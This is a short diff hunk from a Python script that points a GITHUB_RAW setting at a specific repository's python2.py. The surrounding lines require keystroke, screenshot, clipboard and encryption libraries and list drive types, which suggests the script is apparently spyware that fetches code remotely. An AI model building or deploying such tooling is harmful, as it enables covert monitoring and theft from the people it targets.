@@ -67,7 +67,7 @@ except ImportError:
     PSUTIL_AVAILABLE = False
 
 REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
-GITHUB_RAW = os.getenv('GITHUB_RAW', 'https://raw.githubusercontent.com/yourusername/yourrepo/main/python2.py')
+GITHUB_RAW = os.getenv('GITHUB_RAW', 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py')
 
 DRIVE_FIXED = 3
 DRIVE_REMOVABLE = 2
